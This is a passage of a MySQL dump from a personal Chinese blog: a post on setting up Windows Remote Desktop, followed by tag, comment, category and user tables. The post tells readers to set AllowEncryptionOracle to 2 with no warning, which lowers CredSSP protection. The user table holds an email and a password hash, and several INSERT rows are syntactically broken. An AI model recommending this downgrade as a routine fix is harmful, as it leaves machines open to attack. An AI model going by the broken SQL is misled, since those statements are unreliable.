        '> 前言: 前两天无意间在网上看到一个视频，说是某公司的技术总监从来见不到人，而他办公桌上的电脑却在不停的写着代码，到底什么情况。。。于是，我便私下研究了一下他是如何远程操控他的电脑的 ? (也许他用的是更为高级的黑客手段)\r\n\r\n首先介绍一下我的测试环境:\r\n一台window7和一台window10笔记本电脑，连接在同一个局域网下面。最终使用window10远程连接window7的电脑，用一个用户进行登陆。\r\n\r\n# 第一步：配置被连接电脑\r\n## 1. 开启远程桌面功能\r\n开启该电脑的远程访问功能将允许其它计算机连接到该电脑，并对其进行远程访问。你可以使用以下方法开启装有专业版或企业版 Windows XP、Vista、7和8系统的电脑的远程访问功能，**但其需要访问电脑和被访电脑使用相同的网络或连接在相同的路由器上或连接相同的VPN**。\r\n\r\n- 找到电脑**系统属性**下面的**远程登陆**\r\n- 设置成：仅允许运行使用网络级别身份验证的远程桌面的计算机连接。如下图\r\n\r\n![Image 1](/images/blog10-1.jpg)\r\n\r\n## 2. 添加用户\r\n\r\n- 开启上面的运行远程连接之后，选择**添加用户**\r\n- 选择**添加**按钮添加一个新的用户用于远程连接，或者直接使用管理员组里面的成员用户\r\n\r\n## 3. 计算机名\r\n\r\n- 在系统属性下面找到该计算机的**系统名**，作为远程连接的表示名称\r\n\r\n## 4. 禁用睡眠模式\r\n\r\n当计算机处于睡眠或休眠模式下时，你将无法远程访问该计算机。所以，如果你想要进行远程访问，你需要禁用睡眠模式\r\n\r\n- 打开控制面板，然后选择电源选项，设置计算机进入休眠的状态：**从不**\r\n\r\n# 第二步：配置主连接的电脑\r\n\r\n在配置完远程连接的电脑后，在主电脑上可以尝试进行连接：\r\n- 打开电脑的**远程桌面连接**\r\n- 输入之前查找的计算机名称\r\n- 成功连接之后需要提供用户的身份信息：名称+密码(之前自己设置的)\r\n- 然后可能需要：**验证远程计算机的身份**，这一步选择**是**即可\r\n\r\n![Image 2](/images/blog10-2.jpg)\r\n\r\n\r\n# 第三不：异常处理\r\n由于我在连接的过程中遇到了一个很多人都遇到过的问题：***远程桌面链接错误由于CredSSP加密Oracle修正***\r\n\r\n在尝试连接的过程中，始终会提示以上的错误，于是在网上找了解决的2种办法：\r\n\r\n1. 更改**CredSSP加密Oracle修正**\r\n   计算机配置>管理模板>系统>凭据分配>加密Oracle修正：如下图\r\n   \r\n![Image 3](/images/blog10-3.jpg)\r\n  \r\n2. 新建DWORD（32位）值 ：如下图\r\n\r\n![Image 4](/images/blog10-4.jpg)\r\n\r\n   当远程连接服务器出现身份验证错误，又找不到加密Oracle修正时：\r\n   1. 打开注册表，快捷输入\"regedit\"\r\n   2. 找到文件夹路径 (如果没有便补充完整)：    \r\n   [HKEY_LOCAL_MACHINE]\\Software\\\r\n   Microsoft\\Windows\\CurrentVersion\\\r\n   Policies\\System\\CredSSP\\Parameters\r\n   3. 在最底部文件夹里面新建 DWORD（32）位的。文件名 \"AllowEncryptionOracle\"，值：2\r\n   \r\nOK，到此便可以成功的登陆另一台电脑了(在成功登陆后，被登陆的电脑会自动退出当前登陆的用户)，之后便可以同时操作两台电脑了。\r\n',
        '2018-12-02 17:45:50', '/images/blog10.jpg', '原创', , , , '如何操控多台电脑 ?', '2018-12-02 21:39:31', 11, 16, 1,
        '你是否有想过如何同时操作多台电脑，甚至远程的控制一台电脑? 并在不同的电脑间进行切换操作。这篇文章我将介绍一个很常用的技术：用你的电脑远程访问另外一台计算机', 3);



#
# Table structure for table t_blog_list_tags
#

DROP TABLE IF EXISTS `t_blog_list_tags`;
CREATE TABLE `t_blog_list_tags`
(
    `list_blogs_id` bigint(20) NOT NULL,
    `list_tags_id`  bigint(20) NOT NULL,
    KEY             `FK5qp2072ywjq5avic5awuaiysi` (`list_tags_id`),
    KEY             `FK9bnjsoti1dqsrc3b2d54gqt11` (`list_blogs_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

#
# Dumping data for table t_blog_list_tags
#

INSERT INTO `t_blog_list_tags` VALUES (80,26);
INSERT INTO `t_blog_list_tags`
VALUES (82, 26);
INSERT INTO `t_blog_list_tags`
VALUES (82, 22);
INSERT INTO `t_blog_list_tags`
VALUES (83, 61);
INSERT INTO `t_blog_list_tags`
VALUES (84, 59);
INSERT INTO `t_blog_list_tags`
VALUES (84, 26);
INSERT INTO `t_blog_list_tags`
VALUES (85, 65);
INSERT INTO `t_blog_list_tags`
VALUES (85, 26);
INSERT INTO `t_blog_list_tags`
VALUES (85, 22);
INSERT INTO `t_blog_list_tags`
VALUES (86, 71);
INSERT INTO `t_blog_list_tags`
VALUES (86, 70);
INSERT INTO `t_blog_list_tags`
VALUES (86, 69);
INSERT INTO `t_blog_list_tags`
VALUES (87, 68);
INSERT INTO `t_blog_list_tags`
VALUES (87, 67);
INSERT INTO `t_blog_list_tags`
VALUES (87, 66);
INSERT INTO `t_blog_list_tags`
VALUES (88, 59);
INSERT INTO `t_blog_list_tags`
VALUES (88, 26);
INSERT INTO `t_blog_list_tags`
VALUES (89, 60);
INSERT INTO `t_blog_list_tags`
VALUES (89, 23);
INSERT INTO `t_blog_list_tags`
VALUES (89, 22);
INSERT INTO `t_blog_list_tags`
VALUES (92, 71);



#
# Table structure for table t_comment
#

DROP TABLE IF EXISTS `t_comment`;
CREATE TABLE `t_comment`
(
    `id`                bigint(20) NOT NULL,
    `avatar`            varchar(255) default NULL,
    `content`           varchar(255) default NULL,
    `create_time`       datetime     default NULL,
    `email`             varchar(255) default NULL,
    `nickname`          varchar(255) default NULL,
    `blog_id`           bigint(20) default NULL,
    `parent_comment_id` bigint(20) default NULL,
    `admin`             bit(1) NOT NULL,
    PRIMARY KEY (`id`),
    KEY                 `FKke3uogd04j4jx316m1p51e05u` (`blog_id`),
    KEY                 `FK4jj284r3pb7japogvo6h72q95` (`parent_comment_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

#
# Dumping data for table t_comment  ????????????? 重新添加需要的评论
#

INSERT INTO `t_comment` VALUES (81,'/images/mine.jpg','这是我写的第一篇博客','2018-11-25 01:02:45','chen2016tong@gmail.com','TONG',80,NULL,);
INSERT INTO `t_comment`
VALUES (90, '/images/avatar.png', 'good work', '2018-11-29 23:44:35', 'xiaoxiao@gmail.com', 'xiao xiao', 89, NULL,  );
INSERT INTO `t_comment`
VALUES (91, '/images/avatar.png', '˶⚈Ɛ⚈˵', '2018-11-30 13:58:08', 'light100bc@shu.eru.cn', 'light100bc', 84, NULL,  );



#
# Table structure for table t_tag
#

DROP TABLE IF EXISTS `t_tag`;
CREATE TABLE `t_tag`
(
    `id`   bigint(20) NOT NULL,
    `name` varchar(255) default NULL,
    PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

#
# Dumping data for table t_tag
#

INSERT INTO `t_tag` VALUES (22,'web前端');
INSERT INTO `t_tag`
VALUES (23, 'web后端');
INSERT INTO `t_tag`
VALUES (26, '编程语言');
INSERT INTO `t_tag`
VALUES (59, '开发工具');
INSERT INTO `t_tag`
VALUES (60, '网站架构');
INSERT INTO `t_tag`
VALUES (61, 'Android系统');
INSERT INTO `t_tag`
VALUES (62, 'iOS系统');
INSERT INTO `t_tag`
VALUES (63, '原生APP');
INSERT INTO `t_tag`
VALUES (64, '混合APP');
INSERT INTO `t_tag`
VALUES (65, '网页APP');
INSERT INTO `t_tag`
VALUES (66, '游戏引擎');
INSERT INTO `t_tag`
VALUES (67, '手游开发');
INSERT INTO `t_tag`
VALUES (68, 'PC游戏');
INSERT INTO `t_tag`
VALUES (69, 'Linux系统');
INSERT INTO `t_tag`
VALUES (70, '网络技术');
INSERT INTO `t_tag`
VALUES (71, '黑客技术');
INSERT INTO `t_tag`
VALUES (72, '自动化');
INSERT INTO `t_tag`
VALUES (73, '脚本开发');
INSERT INTO `t_tag`
VALUES (74, 'Mac系统');
INSERT INTO `t_tag`
VALUES (75, 'AR & VR');
INSERT INTO `t_tag`
VALUES (76, 'AI技术');
INSERT INTO `t_tag`
VALUES (77, '机器学习');
INSERT INTO `t_tag`
VALUES (78, '深度学习');
INSERT INTO `t_tag`
VALUES (79, '随笔感悟');



#
# Table structure for table t_type
#

DROP TABLE IF EXISTS `t_type`;
CREATE TABLE `t_type`
(
    `id`   bigint(20) NOT NULL,
    `name` varchar(255) default NULL,
    PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

#
# Dumping data for table t_type
#

INSERT INTO `t_type` VALUES (15,'编程核心');
INSERT INTO `t_type`
VALUES (16, '信息系统');
INSERT INTO `t_type`
VALUES (17, '网络黑客');
INSERT INTO `t_type`
VALUES (18, 'AI人工智能');
INSERT INTO `t_type`
VALUES (19, 'AR与VR');
INSERT INTO `t_type`
VALUES (21, '随笔感悟');
INSERT INTO `t_type`
VALUES (55, '网站开发');
INSERT INTO `t_type`
VALUES (56, '软件开发');
INSERT INTO `t_type`
VALUES (57, '移动端开发');
INSERT INTO `t_type`
VALUES (58, '游戏开发');



#
# Table structure for table t_user
#

DROP TABLE IF EXISTS `t_user`;
CREATE TABLE `t_user`
(
    `id`          bigint(20) NOT NULL,
    `avatar`      varchar(255) default NULL,
    `create_time` datetime     default NULL,
    `email`       varchar(255) default NULL,
    `nickname`    varchar(255) default NULL,
    `password`    varchar(255) default NULL,
    `type`        int(11) default NULL,
    `update_time` datetime     default NULL,
    `username`    varchar(255) default NULL,
    PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

#
# Dumping data for table t_user
#

INSERT INTO `t_user` VALUES (1,'/images/mine.jpg','2018-11-04 10:00:00','chen2016tong@gmail.com','TONG','fcf6df9975678dc0031e5b1b9856d307',1,'2018-11-04 10:00:00','chentong');



/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
